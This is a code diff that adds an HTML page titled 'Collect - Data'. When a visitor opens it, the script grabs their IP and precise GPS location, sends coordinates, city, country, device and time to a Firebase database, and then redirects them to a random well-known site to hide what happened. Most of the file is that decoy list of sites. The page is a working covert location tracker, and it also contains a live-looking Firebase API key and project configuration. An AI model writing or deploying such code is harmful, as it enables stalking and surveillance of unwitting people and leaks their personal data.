@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Collect - Data</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #050805; color: #00ff41; font-family: monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+#box { text-align: center; padding: 40px; border: 1px solid #00ff4133; }
+h1 { font-size: 14px; font-weight: 400; margin-bottom: 20px; text-shadow: 0 0 8px #00ff4188; }
+#status { font-size: 12px; color: #00ff4166; }
+.spinner { display: inline-block; width: 10px; height: 10px; border: 2px solid #00ff41; border-top-color: transparent; border-radius: 50%; animation: spin .8s linear infinite; vertical-align: middle; margin-right: 6px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.done { color: #00ff41; text-shadow: 0 0 6px #00ff4188; }
+</style>
+</head>
+<body>
+<div id="box">
+  <h1>> DATA COLLECTOR</h1>
+  <div id="status"><span class="spinner"></span> INITIALIZING...</div>
+</div>
+
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyACGSnLsOq3MRjGOIaIXGvnx7zTLv85ZOM",
+authDomain: "app-store-88307.firebaseapp.com",
+databaseURL: "https://app-store-88307-default-rtdb.firebaseio.com",
+projectId: "app-store-88307",
+storageBucket: "app-store-88307.firebasestorage.app",
+messagingSenderId: "221250728360",
+appId: "1:221250728360:web:5d1882a43423c37f532d9d",
+measurementId: "G-3D0YSYYBCG"
+};
+firebase.initializeApp(firebaseConfig);
+const ref = firebase.database().ref('ubicaciones');
+
+function status(msg, done) {
+  document.getElementById('status').innerHTML = (done ? '' : '<span class="spinner"></span> ') + msg;
+}
+const EXIT_SITES = [
+'https://google.com','https://youtube.com','https://facebook.com','https://instagram.com','https://x.com','https://reddit.com','https://tiktok.com','https://whatsapp.com','https://amazon.com','https://netflix.com',
+'https://wikipedia.org','https://linkedin.com','https://twitch.tv','https://spotify.com','https://yahoo.com','https://bing.com','https://duckduckgo.com','https://pinterest.com','https://ebay.com','https://msn.com',
+'https://microsoft.com','https://apple.com','https://adobe.com','https://zoom.us','https://discord.com','https://github.com','https://stackoverflow.com','https://medium.com','https://quora.com','https://imdb.com',
+'https://cnn.com','https://bbc.com','https://nytimes.com','https://theguardian.com','https://forbes.com','https://bloomberg.com','https://wsj.com','https://reuters.com','https://npr.org','https://foxnews.com',
+'https://aljazeera.com','https://huffpost.com','https://buzzfeed.com','https://vice.com','https://wired.com','https://techcrunch.com','https://theverge.com','https://arstechnica.com','https://cnet.com','https://zdnet.com',
+'https://engadget.com','https://gizmodo.com','https://lifehacker.com','https://kotaku.com','https://ign.com','https://gamespot.com','https://eurogamer.net','https://polygon.com','https://rockpapershotgun.com','https://destructoid.com',
+'https://steampowered.com','https://epicgames.com','https://origin.com','https://ubisoft.com','https://nintendo.com','https://playstation.com','https://xbox.com','https://roblox.com','https://minecraft.net','https://fortnite.com',
+'https://battle.net','https://gog.com','https://humblebundle.com','https://greenmangaming.com','https://fanatical.com','https://weather.com','https://accuweather.com','https://timeanddate.com','https://wolframalpha.com','https://khanacademy.org',
+'https://coursera.org','https://udemy.com','https://edx.org','https://duolingo.com','https://quizlet.com','https://chegg.com','https://grammarly.com','https://scribd.com','https://slideshare.net','https://paypal.com',
+'https://stripe.com','https://squareup.com','https://venmo.com','https://cash.app','https://chase.com','https://bankofamerica.com','https://wellsfargo.com','https://capitalone.com','https://americanexpress.com','https://nerdwallet.com',
+'https://creditkarma.com','https://mint.com','https://robinhood.com','https://coinbase.com','https://binance.com','https://coindesk.com','https://coinmarketcap.com','https://trello.com','https://asana.com','https://notion.so',
+'https://evernote.com','https://dropbox.com','https://box.com','https://onedrive.com','https://outlook.com','https://proton.me','https://tutanota.com','https://mail.com','https://zillow.com','https://realtor.com',
+'https://redfin.com','https://airbnb.com','https://booking.com','https://expedia.com','https://kayak.com','https://trivago.com','https://hotels.com','https://tripadvisor.com','https://uber.com','https://lyft.com',
+'https://doordash.com','https://grubhub.com','https://postmates.com','https://ubereats.com','https://yelp.com','https://opentable.com','https://fedex.com','https://ups.com','https://usps.com','https://dhl.com',
+'https://ikea.com','https://homedepot.com','https://lowes.com','https://walmart.com','https://target.com','https://costco.com','https://bestbuy.com','https://newegg.com','https://microcenter.com','https://bhphotovideo.com',
+'https://nike.com','https://adidas.com','https://zara.com','https://hm.com','https://uniqlo.com','https://gap.com','https://levi.com','https://sephora.com','https://ulta.com','https://etsy.com',
+'https://shopify.com','https://alibaba.com','https://aliexpress.com','https://wish.com','https://shein.com','https://zappos.com','https://wayfair.com','https://cvs.com','https://walgreens.com','https://healthline.com',
+'https://webmd.com','https://mayoclinic.org','https://nhs.uk','https://who.int','https://cdc.gov','https://medscape.com','https://drugs.com','https://cnbc.com','https://marketwatch.com','https://investopedia.com',
+'https://fidelity.com','https://schwab.com','https://vanguard.com','https://morningstar.com','https://tradingview.com','https://ft.com','https://economist.com','https://businessinsider.com','https://usatoday.com','https://latimes.com',
+'https://washingtonpost.com','https://bostonglobe.com','https://nationalgeographic.com','https://discovery.com','https://history.com','https://science.org','https://nature.com','https://newscientist.com','https://sciencedaily.com','https://livescience.com',
+'https://space.com','https://nasa.gov','https://esa.int','https://spacex.com','https://tesla.com','https://nvidia.com','https://amd.com','https://intel.com','https://qualcomm.com','https://ibm.com',
+'https://oracle.com','https://salesforce.com','https://sap.com','https://vmware.com','https://redhat.com','https://docker.com','https://kubernetes.io','https://python.org','https://react.dev','https://angular.io',
+'https://vuejs.org','https://nextjs.org','https://nuxt.com','https://svelte.dev','https://tailwindcss.com','https://bootstrap.com','https://cloudflare.com','https://aws.amazon.com','https://azure.microsoft.com','https://cloud.google.com',
+'https://heroku.com','https://netlify.com','https://vercel.com','https://digitalocean.com','https://linode.com','https://vultr.com','https://godaddy.com','https://namecheap.com','https://bluehost.com','https://hostgator.com',
+'https://wordpress.com','https://wordpress.org','https://wix.com','https://squarespace.com','https://weebly.com','https://blogger.com','https://tumblr.com','https://substack.com','https://ghost.org','https://mailchimp.com',
+'https://sendgrid.com','https://twilio.com','https://atlassian.com','https://slack.com','https://telegram.org','https://signal.org','https://wechat.com','https://line.me','https://snapchat.com','https://tinder.com',
+'https://bumble.com','https://hinge.com','https://flickr.com','https://deviantart.com','https://behance.net','https://dribbble.com','https://artstation.com','https://shutterstock.com','https://gettyimages.com','https://unsplash.com',
+'https://pexels.com','https://pixabay.com','https://freepik.com','https://fontawesome.com','https://fonts.google.com','https://canva.com','https://figma.com','https://soundcloud.com','https://bandcamp.com','https://tidal.com',
+'https://pandora.com','https://iheart.com','https://deezer.com','https://shazam.com','https://genius.com','https://azlyrics.com','https://allrecipes.com','https://foodnetwork.com','https://seriouseats.com','https://bonappetit.com',
+'https://tasty.co','https://delish.com','https://rottentomatoes.com','https://metacritic.com','https://crunchyroll.com','https://hulu.com','https://hbomax.com','https://peacocktv.com','https://disneyplus.com','https://primevideo.com',
+'https://pluto.tv','https://tubitv.com','https://plex.tv','https://vimeo.com','https://espn.com','https://nfl.com','https://nba.com','https://mlb.com','https://nhl.com','https://premierleague.com',
+'https://olympics.com','https://bleacherreport.com','https://irs.gov','https://usa.gov','https://whitehouse.gov','https://un.org','https://nato.int','https://openstreetmap.org','https://archive.org','https://gutenberg.org',
+'https://wikihow.com','https://pcmag.com','https://techradar.com','https://gsmarena.com','https://macrumors.com','https://9to5mac.com','https://howtogeek.com','https://makeuseof.com','https://androidauthority.com','https://sourceforge.net',
+'https://gitlab.com','https://codepen.io','https://jsfiddle.net','https://codesandbox.io','https://kaggle.com','https://hubspot.com','https://zoho.com','https://hootsuite.com','https://abcnews.go.com','https://cbsnews.com',
+'https://nbcnews.com','https://newyorker.com','https://theatlantic.com','https://vox.com','https://politico.com','https://dailymail.co.uk','https://telegraph.co.uk','https://timesofindia.indiatimes.com','https://spiegel.de','https://lemonde.fr',
+'https://corriere.it','https://repubblica.it','https://elmundo.es','https://elpais.com','https://globo.com','https://uol.com.br','https://smh.com.au','https://abc.net.au','https://ynet.co.il','https://haaretz.co.il',
+'https://arabnews.com','https://gulfnews.com','https://weforum.org','https://brookings.edu','https://pewresearch.org','https://gallup.com','https://statista.com','https://noaa.gov','https://usgs.gov','https://britannica.com',
+'https://merriam-webster.com','https://dictionary.com','https://thesaurus.com','https://urbandictionary.com','https://translate.google.com','https://deepl.com','https://photopea.com','https://remove.bg','https://tinyurl.com','https://bitly.com',
+'https://pastebin.com','https://regex101.com','https://leetcode.com','https://hackerrank.com','https://codewars.com','https://codeforces.com','https://freecodecamp.org','https://developer.mozilla.org','https://css-tricks.com','https://brave.com',
+'https://torproject.org','https://protonvpn.com','https://nordvpn.com','https://1password.com','https://bitwarden.com','https://haveibeenpwned.com','https://virustotal.com','https://shodan.io','https://whatismyip.com','https://ipinfo.io',
+'https://pypi.org','https://crates.io','https://opensource.org','https://eff.org',
+];
+function exit() {
+  location.href = EXIT_SITES[Math.floor(Math.random() * EXIT_SITES.length)];
+}
+
+function yaGuardado() {
+  if (localStorage.getItem('u')) return true;
+  localStorage.setItem('u', '1');
+  return false;
+}
+
+function detectDevice() {
+  return /Android|iPhone|iPad|iPod|webOS|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'mobile' : 'pc';
+}
+
+function jitter() {
+  return (Math.random() - 0.5) * 0.01;
+}
+
+function save(pos, ipData) {
+  const lat = pos ? pos.coords.latitude : ipData.lat;
+  const lng = pos ? pos.coords.longitude : ipData.lon;
+  const device = detectDevice();
+  const time = new Date().toLocaleString();
+  const city = pos ? null : (ipData.city || '');
+  const country = pos ? null : (ipData.country || '');
+
+  if (pos) {
+    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`)
+      .then(r => r.json())
+      .then(data => {
+        const c = data.address?.city || data.address?.town || data.address?.village || data.address?.county || 'Desconocida';
+        const co = data.address?.country || '';
+        ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, city: c, country: co, ip: ipData && ipData.ip, time });
+        status('> DONE', true); exit();
+      })
+      .catch(() => {
+        ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, ip: ipData && ipData.ip, time });
+        status('> DONE', true); exit();
+      });
+  } else {
+    ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, city, country, ip: ipData.ip, time });
+    status('> DONE', true); exit();
+  }
+}
+
+if (yaGuardado()) {
+  status('> ALREADY COLLECTED', true); exit();
+} else {
+  status('> OBTAINING IP...');
+  fetch('http://ip-api.com/json/')
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'success') {
+        status('> IP OK - TRYING GPS...');
+        navigator.geolocation.getCurrentPosition(
+          pos => save(pos, data),
+          () => save(null, data),
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
+      }
+    })
+    .catch(() => {
+      status('> IP FAIL - TRYING GPS...');
+      navigator.geolocation.getCurrentPosition(
+        pos => save(pos),
+        () => { status('> ERROR: NO LOCATION', true); exit(); },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    });
+}
+</script>
+</body>
+</html>
